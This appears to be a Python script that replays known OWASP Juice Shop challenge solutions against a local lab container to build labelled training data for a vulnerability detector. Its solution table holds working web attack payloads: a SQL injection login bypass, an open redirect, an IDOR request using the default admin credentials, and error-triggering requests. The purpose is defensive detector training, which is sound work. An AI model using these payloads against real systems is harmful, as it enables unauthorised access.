#!/usr/bin/env python3
"""
tools/juiceshop_agent/seed_detector.py
======================================
Seed the DETECTOR corpus with class-diverse POSITIVES from known Juice Shop solutions.

The detector is a classifier over (request, response) pairs -- it doesn't need a model to
*discover* the exploit. So we replay a handful of known solving requests per vuln class
against a fresh container, capture the real responses, and record positives. This fixes the
class skew from the teacher run (the 14B only solves easy misconfig/info_disclosure, so
sqli/idor/open_redirect had no positives).

Self-correcting by design: every known solution is VERIFIED against the live /api/Challenges
scoreboard before being recorded. If a payload is wrong/outdated for this Juice Shop version,
its challenge flag won't flip and the seeder logs "NOT CONFIRMED" and skips it -- a bad
payload never becomes a labeled positive. Only real, scoreboard-confirmed solves are kept.

Also emits benign NEGATIVES (harmless requests that solve nothing) so the corpus stays a
balanced binary set.

Runs ON the lab against http://localhost:3000. Resets the container first for a clean baseline.
"""
import argparse
import json
import re
import sys
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

import requests

_SABRINA = Path(__file__).resolve().parent.parent.parent
if str(_SABRINA) not in sys.path:
    sys.path.insert(0, str(_SABRINA))

from tools.juiceshop_agent import reward as R          # noqa: E402
from tools.juiceshop_agent import trace_recorder as TR  # noqa: E402
from tools.juiceshop_agent import reset as RS           # noqa: E402

DEFAULT_TARGET = "http://localhost:3000"

# Known solving requests, one entry per challenge we want a positive for. `steps` is a
# sequence (usually one request; auth-requiring challenges have a login prep step first).
# A step may carry "save_token": true to extract authentication.token from its JSON response,
# and later steps may use "{token}" in a header value. The class is the ground-truth label.
KNOWN_SOLUTIONS: List[Dict[str, Any]] = [
    {"key": "loginAdminChallenge", "vuln_class": "sqli", "steps": [
        {"method": "POST", "path": "/rest/user/login",
         "headers": {"Content-Type": "application/json"},
         "body": {"email": "' OR 1=1--", "password": "x"}}]},
    {"key": "directoryListingChallenge", "vuln_class": "info_disclosure", "steps": [
        {"method": "GET", "path": "/ftp/acquisitions.md"}]},
    {"key": "exposedMetricsChallenge", "vuln_class": "info_disclosure", "steps": [
        {"method": "GET", "path": "/metrics"}]},
    {"key": "errorHandlingChallenge", "vuln_class": "misconfig", "steps": [
        {"method": "GET", "path": "/rest/products/x/reviews"}]},  # bad id type -> 500
    {"key": "emptyUserRegistration", "vuln_class": "misconfig", "steps": [
        {"method": "POST", "path": "/api/Users",
         "headers": {"Content-Type": "application/json"},
         "body": {"email": "", "password": ""}}]},
    {"key": "securityPolicyChallenge", "vuln_class": "info_disclosure", "steps": [
        {"method": "GET", "path": "/.well-known/security.txt"}]},
    {"key": "redirectCryptoCurrencyChallenge", "vuln_class": "open_redirect", "steps": [
        {"method": "GET",
         "path": "/redirect?to=https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW"}]},
    # IDOR needs auth: log in as the seeded admin, then read another user's basket.
    {"key": "basketAccessChallenge", "vuln_class": "idor", "steps": [
        {"method": "POST", "path": "/rest/user/login",
         "headers": {"Content-Type": "application/json"},
         "body": {"email": "admin@juice-sh.op", "password": "admin123"}, "save_token": True},
        {"method": "GET", "path": "/rest/basket/2",
         "headers": {"Authorization": "Bearer {token}"}}]},
]

# Benign requests that should solve nothing -> negatives.
BENIGN_NEGATIVES: List[Dict[str, Any]] = [
    {"method": "GET", "path": "/"},
    {"method": "GET", "path": "/rest/products/search?q=apple"},
    {"method": "GET", "path": "/api/Products"},
    {"method": "GET", "path": "/rest/admin/application-version"},
    {"method": "POST", "path": "/rest/user/login",
     "headers": {"Content-Type": "application/json"},
     "body": {"email": "nobody@example.com", "password": "wrongpassword"}},
    {"method": "GET", "path": "/api/Challenges"},
]

_TOKEN_RE = re.compile(r'"token"\s*:\s*"([^"]+)"')


def _fire(step: Dict[str, Any], target: str, token: Optional[str]) -> Dict[str, Any]:
    method = str(step.get("method") or "GET").upper()
    path = step.get("path") or "/"
    headers = dict(step.get("headers") or {})
    for k, v in list(headers.items()):
        if isinstance(v, str) and "{token}" in v:
            headers[k] = v.replace("{token}", token or "")
    body = step.get("body")
    kwargs: Dict[str, Any] = {"headers": headers, "timeout": 10}
    if body is not None and method in ("POST", "PUT", "PATCH", "DELETE"):
        kwargs["json"] = body
    try:
        resp = requests.request(method, f"{target}{path}", **kwargs)
        return {"status": resp.status_code, "body": resp.text, "ok": True}
    except Exception as e:
        return {"status": None, "body": f"{type(e).__name__}: {e}", "ok": False}


def _extract_token(body: str) -> Optional[str]:
    m = _TOKEN_RE.search(body or "")
    return m.group(1) if m else None


def seed_positives(target: str, detector_out: str, reset_each: bool = True) -> Dict[str, Any]:
    confirmed, unconfirmed = [], []
    for sol in KNOWN_SOLUTIONS:
        if reset_each:
            RS.reset_container(wait=True)
        baseline = R.solved_set(target)
        if baseline is None:
            print(f"[seed] {sol['key']}: target down, skipping", flush=True)
            continue
        token = None
        solving_step_req = None
        solving_step_resp = None
        for step in sol["steps"]:
            resp = _fire(step, target, token)
            if step.get("save_token"):
                token = _extract_token(resp["body"])
            solving_step_req = {"method": step.get("method"), "path": step.get("path"),
                                "headers": {k: v for k, v in (step.get("headers") or {}).items()},
                                "body": step.get("body")}
            solving_step_resp = resp
        # Did the target challenge flip?
        flipped = R.newly_solved(target, baseline)
        if flipped and sol["key"] in flipped:
            TR.record_detection_example(
                detector_out, request=solving_step_req,
                response={"status": solving_step_resp["status"], "body": solving_step_resp["body"]},
                vulnerable=True, vuln_class=sol["vuln_class"])
            confirmed.append(sol["key"])
            print(f"[seed] {sol['key']} ({sol['vuln_class']}): CONFIRMED positive recorded", flush=True)
        else:
            unconfirmed.append(sol["key"])
            print(f"[seed] {sol['key']} ({sol['vuln_class']}): NOT CONFIRMED "
                  f"(status={solving_step_resp['status'] if solving_step_resp else '?'}) -- skipped", flush=True)
    return {"confirmed": confirmed, "unconfirmed": unconfirmed}


def seed_negatives(target: str, detector_out: str) -> int:
    n = 0
    for step in BENIGN_NEGATIVES:
        resp = _fire(step, target, None)
        req = {"method": step.get("method"), "path": step.get("path"),
               "headers": dict(step.get("headers") or {}), "body": step.get("body")}
        res = TR.record_detection_example(
            detector_out, request=req,
            response={"status": resp["status"], "body": resp["body"]},
            vulnerable=False, vuln_class=None)
        if res["written"]:
            n += 1
    return n


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default=DEFAULT_TARGET)
    ap.add_argument("--detector-out", default="juiceshop_detector.jsonl")
    ap.add_argument("--no-reset-each", action="store_true",
                    help="don't reset before each positive (faster, but incidental solves may confound)")
    a = ap.parse_args()

    if R.solved_set(a.target) is None:
        print("[seed] FATAL: target unreachable", flush=True)
        sys.exit(2)

    print(f"[seed] seeding detector positives -> {a.detector_out}", flush=True)
    pos = seed_positives(a.target, a.detector_out, reset_each=not a.no_reset_each)
    # negatives after a final reset so they run against a clean app
    RS.reset_container(wait=True)
    neg = seed_negatives(a.target, a.detector_out)

    dstats = TR.detector_stats(a.detector_out)
    print("\n[seed] ===== SUMMARY =====", flush=True)
    print(f"[seed] confirmed positives: {pos['confirmed']}", flush=True)
    print(f"[seed] NOT confirmed (fix payload): {pos['unconfirmed']}", flush=True)
    print(f"[seed] negatives added: {neg}", flush=True)
    print(f"[seed] detector corpus now: {dstats['rows']} rows "
          f"(pos={dstats['positive']} neg={dstats['negative']}) per_class={dstats['per_class']}", flush=True)


if __name__ == "__main__":
    main()
